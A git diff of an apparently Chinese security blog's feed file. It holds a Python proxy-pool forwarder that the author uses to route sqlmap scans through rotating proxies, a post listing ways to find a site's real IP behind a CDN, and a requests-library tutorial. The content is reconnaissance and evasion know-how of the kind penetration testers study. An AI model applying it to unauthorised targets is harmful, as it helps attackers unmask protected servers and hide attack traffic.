class="number">9999</span>))</span><br><span class="line">            <span class="comment"># 最大连接数</span></span><br><span class="line">            self.ser.listen(<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">except</span> error <span class="keyword">as</span> e:</span><br><span class="line">            print(<span class="string">&quot;[-]The local service : &quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;[-]The local service : &quot;</span> + <span class="built_in">str</span>(e)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># 接收客户端数据</span></span><br><span class="line">                client, addr = self.ser.accept()</span><br><span class="line">                print(<span class="string">&#x27;[*]accept %s connect&#x27;</span> % (addr,))</span><br><span class="line">                data = client.recv(<span class="number">1024</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                print(<span class="string">&#x27;[*&#x27;</span> + localtime + <span class="string">&#x27;]: Accept data...&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> error <span class="keyword">as</span> e:</span><br><span class="line">                print(<span class="string">&quot;[-]Local receiving client : &quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[-]Local receiving client : &quot;</span> + <span class="built_in">str</span>(e)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="comment"># 目标代理服务器，将客户端接收数据转发给代理服务器</span></span><br><span class="line">                mbsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                iplen = <span class="built_in">len</span>(self.proxyip)</span><br><span class="line">                proxyip = self.proxyip[random.randint(<span class="number">0</span>, iplen - <span class="number">1</span>)]</span><br><span class="line">                print(<span class="string">&quot;[!]Now proxy ip:&quot;</span> + <span class="built_in">str</span>(proxyip))</span><br><span class="line">                prip = proxyip[<span class="number">0</span>]</span><br><span class="line">                prpo = proxyip[<span class="number">1</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    mbsocket.settimeout(<span class="number">3</span>)</span><br><span class="line">                    mbsocket.connect((prip, prpo))</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    print(<span class="string">&quot;[-]RE_Connect...&quot;</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">#                   except :</span></span><br><span class="line">            <span class="comment">#                       print(&quot;[-]Connect failed,change proxy ip now...&quot;)</span></span><br><span class="line">            <span class="comment">#                      pass</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                mbsocket.send(data)</span><br><span class="line">            <span class="keyword">except</span> error <span class="keyword">as</span> e:</span><br><span class="line">                print(<span class="string">&quot;[-]Sent to the proxy server : &quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[-]Sent to the proxy server : &quot;</span> + <span class="built_in">str</span>(e)</span><br><span class="line">                               </span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="comment"># 从代理服务器接收数据，然后转发回客户端</span></span><br><span class="line">                    data_1 = mbsocket.recv(<span class="number">1024</span>)</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> data_1:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    print(<span class="string">&#x27;[*&#x27;</span> + localtime + <span class="string">&#x27;]: Send data...&#x27;</span>)</span><br><span class="line">                    client.send(data_1)</span><br><span class="line">                <span class="keyword">except</span> socket.timeout <span class="keyword">as</span> e:</span><br><span class="line">                    print(proxyip)</span><br><span class="line">                    print(<span class="string">&quot;[-]Back to the client : &quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 关闭连接</span></span><br><span class="line"></span><br><span class="line">            client.close()</span><br><span class="line">            mbsocket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Loadips</span>():</span></span><br><span class="line">    print(<span class="string">&quot;[*]Loading proxy ips..&quot;</span>)</span><br><span class="line">    ip_list = []</span><br><span class="line">    ip = [<span class="string">&#x27;ip&#x27;</span>, <span class="string">&#x27;port&#x27;</span>]</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;ips.txt&quot;</span>) <span class="keyword">as</span> ips:</span><br><span class="line">        lines = ips.readlines()</span><br><span class="line">                               </span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        ip[<span class="number">0</span>], ip[<span class="number">1</span>] = line.strip().split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        ip[<span class="number">1</span>] = <span class="built_in">eval</span>(ip[<span class="number">1</span>])</span><br><span class="line">        nip = <span class="built_in">tuple</span>(ip)</span><br><span class="line">        ip_list.append(nip)</span><br><span class="line">    <span class="keyword">return</span> ip_list</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;&#x27;&#x27;*Atuhor : V@1n3R.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">*Blog :http://www.Lz1y.cn</span></span><br><span class="line"><span class="string">*date: 2017.7.17</span></span><br><span class="line"><span class="string">*http://www.Lz1y.cn/wordpress/?p=643</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                         __     __    _       _____ ____    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                         \ \   / /_ _/ |_ __ |___ /|  _ \   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                          \ \ / / _` | | &#x27;_ \  |_ \| |_) |  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                           \ V / (_| | | | | |___) |  _ &lt; _ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                            \_/ \__,_|_|_| |_|____/|_| \_(_) </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    ip_list = Loadips()</span><br><span class="line">    <span class="comment">#   ip_list = [(&#x27;118.89.148.92&#x27;,8088)]</span></span><br><span class="line">    <span class="comment">#   ip_list = tuple(ip_list)</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pst = ProxyServerTest(ip_list)</span><br><span class="line">        <span class="comment"># 多线程</span></span><br><span class="line">        t = threading.Thread(target=pst.run, name=<span class="string">&#x27;LoopThread&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;[*]Waiting for connection...&#x27;</span>)</span><br><span class="line">        <span class="comment"># 关闭多线程</span></span><br><span class="line">        t.start()</span><br><span class="line">        t.join()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;[-]main : &quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;[-]main : &quot;</span> + <span class="built_in">str</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<h2 id="SqlMap使用代理池">SqlMap使用代理池</h2>
+<blockquote>
+<p>sqlmap加上代理 “–proxy=http://127.0.0.1:9999” 即可使用</p>
+<p>使用之前建议先检测一下代理的有效性：<a href="http://h.jiguangdaili.com/check/">http://h.jiguangdaili.com/check/</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Sqlmap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>绕过CDN寻找真实IP</title>
+    <url>/2020/06/23/%E7%BB%95%E8%BF%87CDN/</url>
+    <content><![CDATA[<blockquote>
+<p>目前很多站点出于用户体验和安全的角度，使用CDN加速，将域名解析到CDN，这时候就需要绕过CDN来查找真实IP。</p>
+</blockquote>
+<h2 id="一、DNS历史解析记录">一、DNS历史解析记录</h2>
+<p>查询域名的历史解析记录，找网站使用CDN前的解析记录，从而获取真实ip，相关查询的网站有：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">iphistory：https://viewdns.info/iphistory/</span><br><span class="line">DNS查询：（https://dnsdb.io/zh-cn/）</span><br><span class="line">微步在线：（https://x.threatbook.cn/）</span><br><span class="line">域名查询：（https://site.ip138.com/）</span><br><span class="line">DNS历史查询：（https://securitytrails.com/）</span><br><span class="line">Netcraft：https://sitereport.netcraft.com/?url=github.com</span><br></pre></td></tr></table></figure>
+<h2 id="二、子域名">二、子域名</h2>
+<p>很多时候，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。<br>
+常用的子域名查找方法和工具：</p>
+<ol>
+<li>搜索引擎查询：如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。</li>
+<li>在线查询网站：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;tool.chinaz.com&#x2F;subdomain&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;i.links.cn&#x2F;subdomain&#x2F;    </span><br><span class="line">http:&#x2F;&#x2F;subdomain.chaxun.la&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;searchdns.netcraft.com&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.virustotal.com&#x2F;</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>子域名爆破工具</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Layer子域名挖掘机</span><br><span class="line">wydomain：https:&#x2F;&#x2F;github.com&#x2F;ring04h&#x2F;wydomain    </span><br><span class="line">subDomainsBrute:https:&#x2F;&#x2F;github.com&#x2F;lijiejie&#x2F;</span><br><span class="line">Sublist3r:https:&#x2F;&#x2F;github.com&#x2F;aboul3la&#x2F;Sublist3r</span><br></pre></td></tr></table></figure>
+<h2 id="三、网站邮件头信息">三、网站邮件头信息</h2>
+<p>比如：邮箱注册，邮箱找回密码、RSS邮件订阅等功能场景，通过网站给自己发送邮件，从而让目标主动暴露他们的真实的IP，查看邮件头信息，获取到网站的真实IP。</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200623112316.png" alt=""></p>
+<h2 id="四、网络空间安全引擎搜索">四、网络空间安全引擎搜索</h2>
+<p>通过关键字或网站域名，就可以找出被收录的IP，很多时候获取到的就是网站的真实IP。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">钟馗之眼：https:&#x2F;&#x2F;www.zoomeye.org</span><br><span class="line">Shodan：https:&#x2F;&#x2F;www.shodan.io</span><br><span class="line">Fofa：https:&#x2F;&#x2F;fofa.so</span><br></pre></td></tr></table></figure>
+<h2 id="五、利用SSL证书">五、利用SSL证书</h2>
+<p>证书颁发机构(CA)必须将他们发布的每个SSL/TLS证书发布到公共日志中，SSL/TLS证书通常包含域名、子域名和电子邮件地址。因此SSL/TLS证书成为了攻击者的切入点。<br>
+SSL证书搜索引擎：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;censys.io&#x2F;ipv4?q&#x3D;github.com</span><br></pre></td></tr></table></figure>
+<h2 id="六、国外主机解析域名">六、国外主机解析域名</h2>
+<p>大部分 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的DNS查询，很可能获取到真实IP。<br>
+国外多PING测试工具：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;asm.ca.com&#x2F;zh_cn&#x2F;ping.php</span><br><span class="line">http:&#x2F;&#x2F;host-tracker.com&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;www.webpagetest.org&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;dnscheck.pingdom.com&#x2F;</span><br></pre></td></tr></table></figure>
+<h2 id="七、全网扫描">七、全网扫描</h2>
+<p>通过Zmap、masscan等工具对整个互联网发起扫描，针对扫描结果进行关键字查找，获取网站真实IP。</p>
+<ol>
+<li>ZMap号称是最快的互联网扫描工具，能够在45分钟扫遍全网。</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zmap&#x2F;zmap</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>Masscan号称是最快的互联网端口扫描器，最快可以在六分钟内扫遍互联网。</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;robertdavidgraham&#x2F;masscan</span><br></pre></td></tr></table></figure>
+<h2 id="八、配置不当导致绕过">八、配置不当导致绕过</h2>
+<p>在配置CDN的时候，需要指定域名、端口等信息，有时候小小的配置细节就容易导致CDN防护被绕过。</p>
+<ul>
+<li>案例1：为了方便用户访问，<a href="http://xn--www-ot9d021dl8ca199e.test.com">我们常常将www.test.com</a> 和 <a href="http://test.com">test.com</a> 解析到同一个站点，<a href="http://xn--CDNwww-5e8i318auw2h9jblx9h.test.com">而CDN只配置了www.test.com</a>，<a href="http://xn--test-pr9lp7quqa868a.com">通过访问test.com</a>，就可以绕过 CDN 了。</li>
+<li>案例2：站点同时支持http和https访问，CDN只配置 https协议，那么这时访问http就可以轻易绕过。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>技巧</tag>
       </tags>
   </entry>
   <entry>
@@ -1111,188 +1293,6 @@ Cadmus Computer Systems 表示Virtualbox虚拟机<br>
       </categories>
       <tags>
         <tag>VulnHub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>request库使用</title>
-    <url>/2020/07/17/requests%E5%BA%93/</url>
-    <content><![CDATA[<h2 id="构造请求">构造请求</h2>
-<h3 id="请求头">请求头</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">headers=&#123;<span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/vnd.github.v3.text-match+json&#x27;</span>&#125;</span><br><span class="line">res = requests.get(url,headers)</span><br></pre></td></tr></table></figure>
-<h3 id="get请求">get请求</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">res = requests.get(url=<span class="string">&#x27;https://api.github.com/search/repositories&#x27;</span>)</span><br><span class="line">参数</span><br><span class="line"><span class="comment"># res = requests.get(url,params)</span></span><br><span class="line"><span class="comment"># params=&#123;&#x27;q&#x27;:&#x27;requests+language:python&#x27;&#125;</span></span><br><span class="line"><span class="comment"># params=[(&#x27;q&#x27;, &#x27;requests+language:python&#x27;)]</span></span><br><span class="line"><span class="comment"># params=b&#x27;q=requests+language:python&#x27;</span></span><br></pre></td></tr></table></figure>
-<h3 id="其他请求方法">其他请求方法</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.post(<span class="string">&#x27;https://httpbin.org/post&#x27;</span>, data=&#123;<span class="string">&#x27;key&#x27;</span>:<span class="string">&#x27;value&#x27;</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.put(<span class="string">&#x27;https://httpbin.org/put&#x27;</span>, data=&#123;<span class="string">&#x27;key&#x27;</span>:<span class="string">&#x27;value&#x27;</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.delete(<span class="string">&#x27;https://httpbin.org/delete&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.head(<span class="string">&#x27;https://httpbin.org/get&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.patch(<span class="string">&#x27;https://httpbin.org/patch&#x27;</span>, data=&#123;<span class="string">&#x27;key&#x27;</span>:<span class="string">&#x27;value&#x27;</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.options(<span class="string">&#x27;https://httpbin.org/get&#x27;</span>)</span><br><span class="line">消息体</span><br><span class="line"><span class="comment">#  data=&#123;&#x27;key&#x27;:&#x27;value&#x27;&#125;</span></span><br><span class="line"><span class="comment">#  data=[(&#x27;key&#x27;, &#x27;value&#x27;)&#125;</span></span><br><span class="line"><span class="comment">#  json=&#123;&#x27;key&#x27;:&#x27;value&#x27;&#125;</span></span><br></pre></td></tr></table></figure>
-<h2 id="响应处理">响应处理</h2>
-<h3 id="响应状态码">响应状态码</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">status = res.status_code</span><br></pre></td></tr></table></figure>
-<h3 id="响应头信息（键不分大小写）">响应头信息（键不分大小写）</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">requests_header=res.headers[<span class="string">&#x27;content-type&#x27;</span>]</span><br></pre></td></tr></table></figure>
-<h3 id="响应内容">响应内容</h3>
-<h4 id="字节格式查看内容">字节格式查看内容</h4>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = res.content</span><br><span class="line"><span class="comment"># b&#x27;&#123;\n  &quot;current_user_url&quot;: &quot;https://api.github.com/user&quot;,\n  &quot;cur</span></span><br></pre></td></tr></table></figure>
-<h4 id="字符串格式查看内容（序列化JSON）">字符串格式查看内容（序列化JSON）</h4>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">因为对 <span class="built_in">bytes</span> 解码到 <span class="built_in">str</span> 需要一个编码格式，所以如果你没有指定，请求将尝试根据响应头来猜测编码格式</span><br><span class="line">res.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line"></span><br><span class="line">data=res.text</span><br><span class="line"><span class="comment"># &#123;&quot;current_user_url&quot;:&quot;https://api.github.com/user&quot;,&quot;cur</span></span><br></pre></td></tr></table></figure>
-<h4 id="字典形式内容（反序列化JSON）">字典形式内容（反序列化JSON）</h4>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data=res.json()</span><br><span class="line"><span class="comment"># &#123;&#x27;current_user_url&#x27;: &#x27;https://api.github.com/user&#x27;, &#x27;curin</span></span><br><span class="line">提取内容</span><br><span class="line">repository = data[<span class="string">&#x27;items&#x27;</span>][<span class="number">0</span>]</span><br><span class="line">也可以使用 .text 获取 <span class="built_in">str</span> 并使用json.loads() 对其进行反序列化</span><br><span class="line">json.loads(data)</span><br></pre></td></tr></table></figure>
-<h2 id="其他">其他</h2>
-<h3 id="检查请求">检查请求</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">requests 库会在将请求实际发送到目标服务器之前准备该请求。 请求准备包括像验证头信息和序列化JSON内容等</span><br><span class="line">response.request.headers[<span class="string">&#x27;Content-Type&#x27;</span>]</span><br><span class="line">response.request.url</span><br><span class="line">response.request.body</span><br></pre></td></tr></table></figure>
-<h3 id="身份验证">身份验证</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">使用auth 参数，rqeuests 将使用HTTP的基本访问认证方案来应用凭据</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">&#x27;https://api.github.com/user&#x27;</span>, auth=(<span class="string">&#x27;username&#x27;</span>, getpass()))</span><br><span class="line">成功返回&lt;Response [<span class="number">200</span>]&gt;，失败返回&lt;Response [<span class="number">401</span>]&gt;</span><br><span class="line"></span><br><span class="line">HTTPBasicAuth效果同上</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">&#x27;https://api.github.com/user&#x27;</span>, auth=HTTPBasicAuth(<span class="string">&#x27;username&#x27;</span>, getpass()))</span><br><span class="line"></span><br><span class="line">requests 也提供了其他身份验证方法，例如 HTTPDigestAuth 和 HTTPProxyAuth</span><br></pre></td></tr></table></figure>
-<h3 id="关闭SSL证书验证">关闭SSL证书验证</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">&#x27;https://api.github.com&#x27;</span>, verify=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
-<h2 id="性能">性能</h2>
-<h3 id="超时">超时</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">&#x27;https://api.github.com&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">还可以将元组传递给 timeout，第一个元素是连接超时（它允许客户端与服务器建立连接的时间），第二个元素是读取超时（一旦你的客户已建立连接而等待响应的时间）</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">&#x27;https://api.github.com&#x27;</span>, timeout=(<span class="number">2</span>, <span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">超时异常</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> Timeout</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(<span class="string">&#x27;https://api.github.com&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">except</span> Timeout:</span><br><span class="line">    print(<span class="string">&#x27;The request timed out&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&#x27;The request did not time out&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<h3 id="Session对象">Session对象</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Session 用于跨请求保留参数。 例如，如果要跨多个请求使用相同的身份验证,当你的应用程序想要再次连接到同一服务器时，它将重用池中的连接而不是建立新连接。</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.Session() <span class="keyword">as</span> session:</span><br><span class="line">    session.auth = (<span class="string">&#x27;username&#x27;</span>, getpass())</span><br><span class="line">    response = session.get(<span class="string">&#x27;https://api.github.com/user&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<h3 id="最大重试">最大重试</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">通过 Transport Adapters，你可以为每个与之交互的服务定义一组配置。 例如，假设你希望所有对于https://api.github.com的请求在最终抛出 ConnectionError 之前重试三次。 你将构建一个 Transport Adapter，设置其 max_retries 参数，并将其装载到现有的 Session</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.adapters <span class="keyword">import</span> HTTPAdapter</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> ConnectionError</span><br><span class="line"></span><br><span class="line">github_adapter = HTTPAdapter(max_retries=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use `github_adapter` for all requests to endpoints that start with this URL</span></span><br><span class="line">session.mount(<span class="string">&#x27;https://api.github.com&#x27;</span>, github_adapter)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    session.get(<span class="string">&#x27;https://api.github.com&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> ConnectionError <span class="keyword">as</span> ce:</span><br><span class="line">    print(ce)</span><br></pre></td></tr></table></figure>
-<h2 id="结尾">结尾</h2>
-<blockquote>
-<blockquote>
-<p>re库参考：<a href="https://juejin.im/post/5d8c630e51882511f444f65b">https://juejin.im/post/5d8c630e51882511f444f65b</a></p>
-</blockquote>
-</blockquote>
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>python库</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>绕过CDN寻找真实IP</title>
-    <url>/2020/06/23/%E7%BB%95%E8%BF%87CDN/</url>
-    <content><![CDATA[<blockquote>
-<p>目前很多站点出于用户体验和安全的角度，使用CDN加速，将域名解析到CDN，这时候就需要绕过CDN来查找真实IP。</p>
-</blockquote>
-<h2 id="一、DNS历史解析记录">一、DNS历史解析记录</h2>
-<p>查询域名的历史解析记录，找网站使用CDN前的解析记录，从而获取真实ip，相关查询的网站有：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">iphistory：https://viewdns.info/iphistory/</span><br><span class="line">DNS查询：（https://dnsdb.io/zh-cn/）</span><br><span class="line">微步在线：（https://x.threatbook.cn/）</span><br><span class="line">域名查询：（https://site.ip138.com/）</span><br><span class="line">DNS历史查询：（https://securitytrails.com/）</span><br><span class="line">Netcraft：https://sitereport.netcraft.com/?url=github.com</span><br></pre></td></tr></table></figure>
-<h2 id="二、子域名">二、子域名</h2>
-<p>很多时候，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。<br>
-常用的子域名查找方法和工具：</p>
-<ol>
-<li>搜索引擎查询：如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。</li>
-<li>在线查询网站：</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;tool.chinaz.com&#x2F;subdomain&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;i.links.cn&#x2F;subdomain&#x2F;    </span><br><span class="line">http:&#x2F;&#x2F;subdomain.chaxun.la&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;searchdns.netcraft.com&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.virustotal.com&#x2F;</span><br></pre></td></tr></table></figure>
-<ol start="3">
-<li>子域名爆破工具</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Layer子域名挖掘机</span><br><span class="line">wydomain：https:&#x2F;&#x2F;github.com&#x2F;ring04h&#x2F;wydomain    </span><br><span class="line">subDomainsBrute:https:&#x2F;&#x2F;github.com&#x2F;lijiejie&#x2F;</span><br><span class="line">Sublist3r:https:&#x2F;&#x2F;github.com&#x2F;aboul3la&#x2F;Sublist3r</span><br></pre></td></tr></table></figure>
-<h2 id="三、网站邮件头信息">三、网站邮件头信息</h2>
-<p>比如：邮箱注册，邮箱找回密码、RSS邮件订阅等功能场景，通过网站给自己发送邮件，从而让目标主动暴露他们的真实的IP，查看邮件头信息，获取到网站的真实IP。</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200623112316.png" alt=""></p>
-<h2 id="四、网络空间安全引擎搜索">四、网络空间安全引擎搜索</h2>
-<p>通过关键字或网站域名，就可以找出被收录的IP，很多时候获取到的就是网站的真实IP。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">钟馗之眼：https:&#x2F;&#x2F;www.zoomeye.org</span><br><span class="line">Shodan：https:&#x2F;&#x2F;www.shodan.io</span><br><span class="line">Fofa：https:&#x2F;&#x2F;fofa.so</span><br></pre></td></tr></table></figure>
-<h2 id="五、利用SSL证书">五、利用SSL证书</h2>
-<p>证书颁发机构(CA)必须将他们发布的每个SSL/TLS证书发布到公共日志中，SSL/TLS证书通常包含域名、子域名和电子邮件地址。因此SSL/TLS证书成为了攻击者的切入点。<br>
-SSL证书搜索引擎：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;censys.io&#x2F;ipv4?q&#x3D;github.com</span><br></pre></td></tr></table></figure>
-<h2 id="六、国外主机解析域名">六、国外主机解析域名</h2>
-<p>大部分 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的DNS查询，很可能获取到真实IP。<br>
-国外多PING测试工具：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;asm.ca.com&#x2F;zh_cn&#x2F;ping.php</span><br><span class="line">http:&#x2F;&#x2F;host-tracker.com&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;www.webpagetest.org&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;dnscheck.pingdom.com&#x2F;</span><br></pre></td></tr></table></figure>
-<h2 id="七、全网扫描">七、全网扫描</h2>
-<p>通过Zmap、masscan等工具对整个互联网发起扫描，针对扫描结果进行关键字查找，获取网站真实IP。</p>
-<ol>
-<li>ZMap号称是最快的互联网扫描工具，能够在45分钟扫遍全网。</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zmap&#x2F;zmap</span><br></pre></td></tr></table></figure>
-<ol start="2">
-<li>Masscan号称是最快的互联网端口扫描器，最快可以在六分钟内扫遍互联网。</li>
-</ol>
